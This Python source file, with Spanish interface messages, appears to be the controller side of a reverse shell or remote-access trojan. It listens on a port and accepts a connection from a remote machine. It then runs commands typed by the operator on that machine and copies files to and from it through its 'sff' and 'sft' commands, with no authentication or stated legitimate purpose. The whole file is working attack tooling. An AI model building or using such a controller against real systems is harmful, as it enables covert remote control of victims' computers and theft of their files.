import socket
import os
import re
from time import sleep
from colorama import init
from colorama.ansi import Fore

init(autoreset=True)

class TCP:
    def __init__(self, host, port, chunk):
        self.__host = host
        self.__port = port

        if chunk <= 0 or chunk > 8:
            self.__chunk = 1024
        else:
            self.__chunk = chunk * 1024

        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.__sock.bind((self.__host, self.__port))
        self.__sock.listen(1)
        print(Fore.CYAN + f"[*] Esperando conexion en el puerto {self.__port}")

        self.__conexion, self.__addr = self.__sock.accept()
        print(Fore.GREEN + f"[+] Conexion establecida con {self.__addr[0]}")

        sleep(0.05)
        self.__conexion.send(str(self.__chunk).encode())
        info = self.__conexion.recv(1024).decode()
        info = info.split('\n')
        self.__userName = info[0]
        self.__hostName = info[1]
        self.__currentDir = info[2]

    def terminal(self):
        print(Fore.GREEN + "\u250c\u2500\u2500(" + Fore.BLUE + f"{self.__userName}~{self.__hostName}" + Fore.GREEN + ")-[" + Fore.WHITE + self.__currentDir + Fore.GREEN + ']')
        print(Fore.GREEN + "\u2514\u2500" + Fore.BLUE + "> ", end='')

    def getNombre(self, ubicacion):
        nombre = os.path.abspath(ubicacion)
        nombre = os.path.basename(nombre)
        return nombre

    def enviarArchivo(self, ubicacion):
        tam = os.path.getsize(ubicacion)
        paquetes = int(tam/self.__chunk)
        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

        sleep(0.1)
        i = 1
        with open(ubicacion, 'rb') as archivo:
            info = archivo.read(self.__chunk)
            while info:
                self.__conexion.send(info)
                info = archivo.read(self.__chunk)
                print(f"Paquete {i} enviado", end='\r')
                i += 1
                sleep(0.05)
        archivo.close()

        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" enviado")

    def recibirArchivo(self, ubicacion):
        paquetes = self.__conexion.recv(1024).decode()
        print(Fore.CYAN + f"[*] Paquetes estimados: {paquetes}")

        i = 1
        with open(ubicacion, 'wb') as archivo:
            while True:
                info = self.__conexion.recv(self.__chunk)
                archivo.write(info)

                if len(info) < self.__chunk:
                    break
                print(f"Paquete {i} recibido", end='\r')
                i += 1
        archivo.close()
        print(Fore.GREEN + f"[+] Archivo \"{ubicacion}\" creado")

    def local(self, cmd):
        if cmd.lower()[:2] == "cd":
            directorio = cmd[3:]
            if os.path.isdir(directorio):
                os.chdir(directorio)
                print(os.getcwd())

            else:
                print(Fore.YELLOW + f"[!] Directorio \"{directorio}\" no encontrado")

        else:
            os.system(cmd)

    def exit(self, cmd):
        print(Fore.MAGENTA + f"[?] Segur@ que quieres terminar la conexion con {self.__addr}?...\n[S/n] ", end='')
        res = input()

        if len(res) == 0 or res.upper() == 'S':
            self.__conexion.send(cmd.encode())
            self.__conexion.close()
            self.__sock.close()
            print(Fore.YELLOW + f"[!] Conexion terminada con {self.__addr[0]}")
        else:
            print(Fore.YELLOW + f"[!] Operacion cancelada")

    def cd(self, cmd):
        self.__conexion.send(cmd.encode())

        msg = self.__conexion.recv(1042).decode()
        if msg[:6] != "error:":
            self.__currentDir = msg
        else:
            print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")

    def sendFileFrom(self, cmd):
        if re.search("-d", cmd):
            destino = re.findall("-d[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
            self.__conexion.send(cmd.encode())

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                self.recibirArchivo(destino)

            else:
                print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")

        else:
            self.__conexion.send(cmd.encode())

            msg = self.__conexion.recv(1024).decode()
            if msg[:6] != "error:":
                destino = self.__conexion.recv(1024).decode()
                self.recibirArchivo(destino)

            else:
                print(Fore.RED + f"[-] {self.__addr[0]}: {msg}")

    def sendFileTo(self, cmd):
        if re.search("-d", cmd):
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*) -d", cmd)[0]

            if os.path.isfile(origen):
                self.__conexion.send(cmd.encode())
                self.enviarArchivo(origen)

            else:
                print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")

        else:
            origen = re.findall("-o[= ]([a-zA-Z0-9./ ].*)", cmd)[0]

            if os.path.isfile(origen):
                self.__conexion.send(cmd.encode())
                nombre = self.getNombre(origen)

                sleep(0.05)
                self.__conexion.send(nombre.encode())
                self.enviarArchivo(origen)

            else:
                print(Fore.YELLOW + f"[!] Archivo \"{origen}\" no encontrado")

    def shell(self):
        try:
            while True:
                self.terminal()
                cmd = input()

                if cmd[0] == '!':
                    try:
                        self.local(cmd[1:])

                    except:
                        print(Fore.RED + "[-] Error de sintaxis local")

                elif cmd.lower() == "clear" or cmd.lower() == "cls" or cmd.lower() == "clc":
                    os.system("clear")

                elif cmd.lower() == "exit":
                    try:
                        self.exit(cmd)
                        break

                    except:
                        print(Fore.RED + "[-] Error al terminar la conexion")

                elif cmd.lower() == 'q' or cmd.lower() == "quit":
                    try:
                        self.__conexion.send(cmd.encode())
                        self.__conexion.close()
                        self.__sock.close()
                        break

                    except:
                        print(Fore.RED + "[-] Error al cerrar el programa")

                elif cmd.lower()[:2] == "cd":
                    try:
                        self.cd(cmd)

                    except:
                        print(Fore.RED + "[-] Error de proceso (cd)")

                elif cmd.lower()[:3] == "sff":
                    try:
                        if re.search("-o", cmd):
                            self.sendFileFrom(cmd)

                        else:
                            print(Fore.YELLOW + f"[!] Falta del parametro de origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (sff)")

                elif cmd.lower()[:3] == "sft":
                    try:
                        if re.search("-o", cmd):
                            self.sendFileTo(cmd)
                        else:
                            print(Fore.RED + "[!] Falta del parametro de origen (-o)")

                    except:
                        print(Fore.RED + "[-] Error de proceso (sft)")

                else:
                    try:
                        if cmd == '' or cmd.replace(' ', '') == '':
                            print(Fore.YELLOW + "[!] Comando no valido")

                        else:
                            self.__conexion.send(cmd.encode())

                            while True:
                                info = self.__conexion.recv(self.__chunk)
                                info = ''.join([chr(i) for i in info])
                                print(info)

                                if len(info) < self.__chunk:
                                    break

                    except:
                        print(Fore.RED + "[-] Error al ejecutar el comando")

        except:
            print(Fore.RED + "Excepcion en el programa principal")
